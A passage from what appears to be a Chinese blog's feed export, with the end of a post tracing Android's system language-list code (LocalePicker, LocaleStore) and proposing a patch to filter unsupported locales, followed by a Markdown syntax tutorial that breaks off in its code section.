class="built_in">this</span>.mTranslatedOnly = translatedOnly;</span><br><span class="line">      setRetainInstance(<span class="literal">true</span>);</span><br><span class="line">   <span class="comment">// 注释2_11_1：这部分的逻辑是 获取已经添加的语言列表，作为需要忽略的部分，毕竟已经添加的，还能再添加就不合理了</span></span><br><span class="line">      <span class="keyword">final</span> HashSet&lt;String&gt; langTagsToIgnore = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">      <span class="keyword">if</span> (!translatedOnly) &#123;</span><br><span class="line">         <span class="keyword">final</span> <span class="type">LocaleList</span> <span class="variable">userLocales</span> <span class="operator">=</span> LocalePicker.getLocales();</span><br><span class="line">         <span class="keyword">final</span> String[] langTags = userLocales.toLanguageTags().split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">         Collections.addAll(langTagsToIgnore, langTags);</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// 注释2_11_2：这里做了选择的语言不为空的判断后，就将逻辑流程 传递给了 LocaleStore.java </span></span><br><span class="line">   <span class="comment">// 的getLevelLocales方法,从而获得一个新的已添加语言列表</span></span><br><span class="line">      <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">         mLocaleList = LocaleStore.getLevelLocales(context,</span><br><span class="line">                  langTagsToIgnore, parent, translatedOnly);</span><br><span class="line">         <span class="keyword">if</span> (mLocaleList.size() &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (listener != <span class="literal">null</span> &amp;&amp; (mLocaleList.size() == <span class="number">1</span>)) &#123;</span><br><span class="line">                  listener.onLocaleSelected(mLocaleList.iterator().next());</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         mLocaleList = LocaleStore.getLevelLocales(context, langTagsToIgnore,</span><br><span class="line">                  <span class="literal">null</span> <span class="comment">/* no parent */</span>, translatedOnly);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>由于上面的添加流程，已经走完，转向了<strong>LocaleStore.java</strong> 这里，那就看看</p><p><strong>base/core/java/com/android/internal/app/LocaleStore.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line">   <span class="meta">@UnsupportedAppUsage</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Set&lt;LocaleInfo&gt; <span class="title function_">getLevelLocales</span><span class="params">(Context context, Set&lt;String&gt; ignorables,</span></span><br><span class="line"><span class="params">         LocaleInfo parent, <span class="type">boolean</span> translatedOnly)</span> &#123;</span><br><span class="line">      <span class="comment">// 注释2_12_1：这个方法很关键，后面逻辑处理保存的数据，需要这里先做预处理的</span></span><br><span class="line">      fillCache(context);</span><br><span class="line">      <span class="type">String</span> <span class="variable">parentId</span> <span class="operator">=</span> parent == <span class="literal">null</span> ? <span class="literal">null</span> : parent.getId();</span><br><span class="line"></span><br><span class="line">      HashSet&lt;LocaleInfo&gt; result = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">      <span class="keyword">for</span> (LocaleStore.LocaleInfo li : sLocaleCache.values()) &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">level</span> <span class="operator">=</span> getLevel(ignorables, li, translatedOnly);</span><br><span class="line">         <span class="keyword">if</span> (level == <span class="number">2</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123; <span class="comment">// region selection</span></span><br><span class="line">                  <span class="keyword">if</span> (parentId.equals(li.getParent().toLanguageTag())) &#123;</span><br><span class="line">                     result.add(li);</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123; <span class="comment">// language selection</span></span><br><span class="line">                  <span class="keyword">if</span> (li.isSuggestionOfType(LocaleInfo.SUGGESTION_TYPE_SIM)) &#123;</span><br><span class="line">                     result.add(li);</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     result.add(getLocaleInfo(li.getParent()));</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   ......<span class="comment">// fillCache方法内部逻辑不少，只看下核心部分</span></span><br><span class="line">   </span><br><span class="line">   <span class="meta">@UnsupportedAppUsage</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fillCache</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (sFullyInitialized) &#123;</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ......</span><br><span class="line">      <span class="comment">// 注释2_12_2：LocalePicker.getSupportedLocales(context) 这个方法很关键 ，他是整个数据处理的来源</span></span><br><span class="line">   <span class="keyword">for</span> (String localeId : LocalePicker.getSupportedLocales(context)) &#123;</span><br><span class="line">         <span class="keyword">if</span> (localeId.isEmpty()) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllformedLocaleException</span>(<span class="string">&quot;Bad locale entry in locale_config.xml&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="type">LocaleInfo</span> <span class="variable">li</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LocaleInfo</span>(localeId);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (LocaleList.isPseudoLocale(li.getLocale())) &#123;</span><br><span class="line">               <span class="keyword">if</span> (isInDeveloperMode) &#123;</span><br><span class="line">                  li.setTranslated(<span class="literal">true</span>);</span><br><span class="line">                  li.mIsPseudo = <span class="literal">true</span>;</span><br><span class="line">                  li.mSuggestionFlags |= LocaleInfo.SUGGESTION_TYPE_SIM;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">// Do not display pseudolocales unless in development mode.</span></span><br><span class="line">                  <span class="keyword">continue</span>;</span><br><span class="line">               &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (simCountries.contains(li.getLocale().getCountry())) &#123;</span><br><span class="line">               li.mSuggestionFlags |= LocaleInfo.SUGGESTION_TYPE_SIM;</span><br><span class="line">         &#125;</span><br><span class="line">            <span class="comment">// 注释2_12_3： 这也是2_12_1处后续逻辑处理 sLocaleCache的加载的地方</span></span><br><span class="line">         sLocaleCache.put(li.getId(), li);</span><br><span class="line">         <span class="keyword">final</span> <span class="type">Locale</span> <span class="variable">parent</span> <span class="operator">=</span> li.getParent();</span><br><span class="line">         <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="type">String</span> <span class="variable">parentId</span> <span class="operator">=</span> parent.toLanguageTag();</span><br><span class="line">               <span class="keyword">if</span> (!sLocaleCache.containsKey(parentId)) &#123;</span><br><span class="line">                  sLocaleCache.put(parentId, <span class="keyword">new</span> <span class="title class_">LocaleInfo</span>(parent));</span><br><span class="line">               &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      ......</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>看到上一步，其实数据源来自LocalePicker.getSupportedLocales(context)，那就看看<br><strong>base/core/java/com/android/internal/app/LocalePicker.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">// 注释2_13_1：这个方法也很关键，这是获取系统资源配置支持的语言列表</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String[] getSystemAssetLocales() &#123;</span><br><span class="line">      <span class="keyword">return</span> Resources.getSystem().getAssets().getLocales();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String[] getSupportedLocales(Context context) &#123;</span><br><span class="line">   <span class="comment">// 注释2_13：好了，找到这里，似乎真相大白了，所有的语言列表，都是从这个supported_locales 资源数组获取的</span></span><br><span class="line">   <span class="comment">// 资源位置：base/core/res/res/values/locale_config.xml</span></span><br><span class="line">      String[] allLocales = context.getResources().getStringArray(R.array.supported_locales);</span><br><span class="line">      Predicate&lt;String&gt; localeFilter = getLocaleFilter();</span><br><span class="line">      <span class="keyword">if</span> (localeFilter == <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> allLocales;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      List&lt;String&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(allLocales.length);</span><br><span class="line">      <span class="keyword">for</span> (String locale : allLocales) &#123;</span><br><span class="line">         <span class="keyword">if</span> (localeFilter.test(locale)) &#123;</span><br><span class="line">               result.add(locale);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">int</span> <span class="variable">localeCount</span> <span class="operator">=</span> result.size();</span><br><span class="line">      <span class="keyword">return</span> (localeCount == allLocales.length) ? allLocales</span><br><span class="line">               : result.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[localeCount]);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>好了分析到这里，加载的流程也基本结束了。</p><h3 id="最后总结"><a href="#最后总结" class="headerlink" title="最后总结"></a>最后总结</h3><ul><li>R.array.supported_locales 获取到的语言列表 是config 里的xml 配置，如果要对系统做语言支持上的变动，可以改这里</li><li>Resources.getSystem().getAssets().getLocales()才是系统真正可以支持的语言列表，ActivityTaskManagerService.java的updateGlobalConfigurationLocked 方法里判断选择的语言是不是可用，也是用的这个资源作为判断依据</li><li>R.array.supported_locales里的语言配置，可能Resources.getSystem().getAssets().getLocales()不能全部支持，这就会导致我们添加了某个语言，切换到它，但是却没效果，所以有个更好的优化方案这边分享一个：</li></ul><p>修改 <strong>base/core/java/com/android/internal/app/LocalePicker.java 的 getSupportedLocales</strong> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String[] getSupportedLocales(Context context) &#123;</span><br><span class="line">   String[] allLocales = context.getResources().getStringArray(R.array.supported_locales);</span><br><span class="line">   <span class="comment">// 设置切换语言不支持的问题__配置可支持的语言筛掉没有系统资源配置的</span></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">   Predicate&lt;String&gt; localeFilter = getLocaleFilter();</span></span><br><span class="line"><span class="comment">   if (localeFilter == null) &#123;</span></span><br><span class="line"><span class="comment">      return allLocales;</span></span><br><span class="line"><span class="comment">   &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   List&lt;String&gt; result = new ArrayList&lt;&gt;(allLocales.length);</span></span><br><span class="line"><span class="comment">   for (String locale : allLocales) &#123;</span></span><br><span class="line"><span class="comment">      if (localeFilter.test(locale)) &#123;</span></span><br><span class="line"><span class="comment">            result.add(locale);</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">   &#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   Predicate&lt;String&gt; localeFilter = getLocaleFilter();</span><br><span class="line">   List&lt;String&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(allLocales.length);</span><br><span class="line">   String[] sysAssetLocales = getSystemAssetLocales();</span><br><span class="line">   <span class="keyword">for</span>(String locale : allLocales)&#123;</span><br><span class="line">      <span class="keyword">if</span>(!isCongenericLocales(sysAssetLocales,locale))&#123;</span><br><span class="line">            <span class="comment">// 本地资源配没有有配置直接跳过继续检查下一个</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(localeFilter == <span class="literal">null</span>)&#123;</span><br><span class="line">            result.add(locale);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (localeFilter.test(locale)) &#123;</span><br><span class="line">               result.add(locale);</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> <span class="variable">localeCount</span> <span class="operator">=</span> result.size();</span><br><span class="line">   <span class="keyword">return</span> (localeCount == allLocales.length) ? allLocales</span><br><span class="line">            : result.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[localeCount]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置切换语言不支持的问题__筛查系统没有配置资源的语言</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isCongenericLocales</span><span class="params">(String[] sysAssetLocales, String xmlLocales)</span>&#123;</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(xmlLocales !=<span class="literal">null</span>)&#123;</span><br><span class="line">            String[] xmlPartHead = xmlLocales.split(<span class="string">&quot;-&quot;</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">for</span>(String assetLocales : sysAssetLocales)&#123;</span><br><span class="line">               String[] sysPartHead = assetLocales.split(<span class="string">&quot;-&quot;</span>,<span class="number">2</span>);</span><br><span class="line">               <span class="keyword">if</span>(xmlPartHead[<span class="number">0</span>].equals(sysPartHead[<span class="number">0</span>]))&#123;</span><br><span class="line">                  result = <span class="literal">true</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">      Log.e(TAG, <span class="string">&quot;Failed to deal sysAssetLocales and xmlLocales compare!&quot;</span>, e);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown基本语法</title>
      <link href="/2023/03/17/2023-03-17/"/>
      <url>/2023/03/17/2023-03-17/</url>
      
        <content type="html"><![CDATA[<p>Markdown 是一种轻量级标记语言， 它允许人们使用易读易写的纯文本格式编写文档，然后转换成有效的 XHTML（或者HTML）文档。这种语言吸收了很多在电子邮件中已有的纯文本标记的特性。<br>由于 Markdown 的<strong>轻量化、易读易写特性</strong>，并且对于图片，图表、数学式都有支持，许多网站都广泛使用 Markdown 来撰写帮助文档或是用于论坛上发表消息。</p><p><strong>优点：</strong><br>1、因为是纯文本，所以只要支持Markdown的地方都能获得一样的编辑效果，可以让作者摆脱排版的困扰，专心写作。<br>2、操作简单。比如:WYSIWYG编辑时标记个标题，先选中内容，再点击导航栏的标题按钮，选择几级标题。要三个步骤。而Markdown只需要在标题内容前加#即可<br><strong>缺点：</strong><br>1、需要记一些语法（当然，是很简单。五分钟学会）。<br>2、有些平台不支持Markdown编辑模式。</p><h2 id="一、标题"><a href="#一、标题" class="headerlink" title="一、标题"></a>一、标题</h2><p>在想要设置为标题的文字前面加#来表示<br>一个#是一级标题，二个#是二级标题，以此类推。支持六级标题。<br>注：标准语法一般在#后跟个空格再写文字，貌似简书不加空格也行。<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 这是一级标题</span><br><span class="line">## 这是二级标题</span><br><span class="line">### 这是三级标题</span><br><span class="line">#### 这是四级标题</span><br><span class="line">##### 这是五级标题</span><br><span class="line">###### 这是六级标题</span><br></pre></td></tr></table></figure><p>效果如下：</p><h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><hr><h2 id="二、字体"><a href="#二、字体" class="headerlink" title="二、字体"></a>二、字体</h2><h3 id="加粗"><a href="#加粗" class="headerlink" title="加粗"></a>加粗</h3><p>要加粗的文字左右分别用两个*号包起来</p><h3 id="斜体"><a href="#斜体" class="headerlink" title="斜体"></a>斜体</h3><p>要倾斜的文字左右分别用一个*号包起来</p><h3 id="斜体加粗"><a href="#斜体加粗" class="headerlink" title="斜体加粗"></a>斜体加粗</h3><p>要倾斜和加粗的文字左右分别用三个*号包起来</p><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><p>要加删除线的文字左右分别用两个~~号包起来</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**这是加粗的文字**</span><br><span class="line">*这是倾斜的文字*`</span><br><span class="line">***这是斜体加粗的文字***</span><br><span class="line">~~这是加删除线的文字~~</span><br></pre></td></tr></table></figure><p>效果如下：<br><strong>这是加粗的文字</strong><br><em>这是倾斜的文字</em>`<br><em><strong>这是斜体加粗的文字</strong></em><br><del>这是加删除线的文字</del></p><hr><h2 id="三、引用"><a href="#三、引用" class="headerlink" title="三、引用"></a>三、引用</h2><p>在引用的文字前加&gt;即可。引用也可以嵌套，如加两个&gt;&gt;三个&gt;&gt;&gt;<br>n个…<br>貌似可以一直加下去，但没神马卵用<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;这是引用的内容</span><br><span class="line">&gt;&gt;这是引用的内容</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>这是引用的内容</p><blockquote><p>这是引用的内容</p><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><p>这是引用的内容</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote><hr><h2 id="四、分割线"><a href="#四、分割线" class="headerlink" title="四、分割线"></a>四、分割线</h2><p>三个或者三个以上的 - 或者 * 都可以。<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">----</span><br><span class="line">***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure><p>效果如下：<br>可以看到，显示效果是一样的。</p><hr><hr><hr><hr><hr><h2 id="五、图片"><a href="#五、图片" class="headerlink" title="五、图片"></a>五、图片</h2><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![图片alt](图片地址 &#x27;&#x27;图片title&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">图片alt就是显示在图片下面的文字，相当于对图片内容的解释。</span><br><span class="line">图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image_alt](/images/logo.png &quot;image_title&quot;)</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/images/logo.png" alt="image_alt" title="image_title"></p><hr><h2 id="六、超链接"><a href="#六、超链接" class="headerlink" title="六、超链接"></a>六、超链接</h2><p>语法：<br><a href="%E8%B6%85%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80" title="超链接title">超链接名</a><br>title可加可不加</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[百度一下，你就知道](http://baidu.com)</span><br></pre></td></tr></table></figure><p>效果如下：<br><a href="http://baidu.com/">百度一下，你就知道</a><br>注：Markdown本身语法不支持链接在新页面中打开</p><hr><h2 id="七、列表"><a href="#七、列表" class="headerlink" title="七、列表"></a>七、列表</h2><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><p>语法：<br>无序列表用 - + * 任何一种都可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 列表内容</span><br><span class="line">+ 列表内容</span><br><span class="line">* 列表内容</span><br><span class="line">注意：- + * 跟内容之间都要有一个空格</span><br></pre></td></tr></table></figure><p>效果如下：</p><ul><li>列表内容</li></ul><ul><li>列表内容</li></ul><ul><li>列表内容</li></ul><h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><p>语法：<br>数字加点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 列表内容</span><br><span class="line">2. 列表内容</span><br><span class="line">3. 列表内容</span><br><span class="line">注意：序号跟内容之间要有空格</span><br></pre></td></tr></table></figure><p>效果如下：</p><ol><li>列表内容</li><li>列表内容</li><li>列表内容</li></ol><h3 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h3><p>上一级和下一级之间敲三个空格即可</p><h4 id="无序列表-1"><a href="#无序列表-1" class="headerlink" title="无序列表:"></a>无序列表:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+ 一级无序列表内容</span><br><span class="line">   + 二级无序列表内容</span><br><span class="line">   + 二级无序列表内容</span><br><span class="line">   + 二级无序列表内容</span><br></pre></td></tr></table></figure><p>效果如下：</p><ul><li>一级无序列表内容<ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul></li></ul><h4 id="有序列表-1"><a href="#有序列表-1" class="headerlink" title="有序列表:"></a>有序列表:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 一级有序列表内容</span><br><span class="line"></span><br><span class="line">   1. 二级无序列表内容</span><br><span class="line">   1. 二级无序列表内容</span><br><span class="line">   1. 二级无序列表内容</span><br></pre></td></tr></table></figure><p>效果如下：</p><ol><li><p>一级有序列表内容</p><ol><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ol></li></ol><hr><h2 id="八、表格"><a href="#八、表格" class="headerlink" title="八、表格"></a>八、表格</h2><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">表头|表头|表头</span><br><span class="line">---|:--:|---:</span><br><span class="line">内容|内容|内容</span><br><span class="line">内容|内容|内容</span><br><span class="line"></span><br><span class="line">第二行分割表头和内容。</span><br><span class="line">- 有一个就行，为了对齐，多加了几个</span><br><span class="line">文字默认居左</span><br><span class="line">-两边加：表示文字居中</span><br><span class="line">-右边加：表示文字居右</span><br><span class="line">注：原生的语法两边都要用 | 包起来。此处省略</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">姓名|技能|排行</span><br><span class="line">--|:--:|--:</span><br><span class="line">刘备|哭|大哥</span><br><span class="line">关羽|打|二哥</span><br><span class="line">张飞|骂|三弟</span><br></pre></td></tr></table></figure><p>效果如下：<br>姓名|技能|排行<br>–|:–:|–:<br>刘备|哭|大哥<br>关羽|打|二哥<br>张飞|骂|三弟</p><hr><h2 id="九、代码"><a href="#九、代码" class="headerlink" title="九、代码"></a>九、代码</h2><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">单行代码：代码之间分别用一个反引号包起来</span><br><span class="line">    `代码内容`</span><br><span class="line"></span><br><span class="line">代码块：代码之间分别用三个反引号包起来，且两边的反引号单独占一行</span><br><span class="line">(```)</span><br><span class="line">  代码...</span><br><span class="line">  代码...</span><br><span class="line">  代码...</span><br><span class="line">(```)</span><br><span class="line"></span><br><span class="line">注：为了防止转译，前后三个反引号处加了小括号，实际是没有的。这里只是用来演示，实际中去掉两边小括号即可。</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 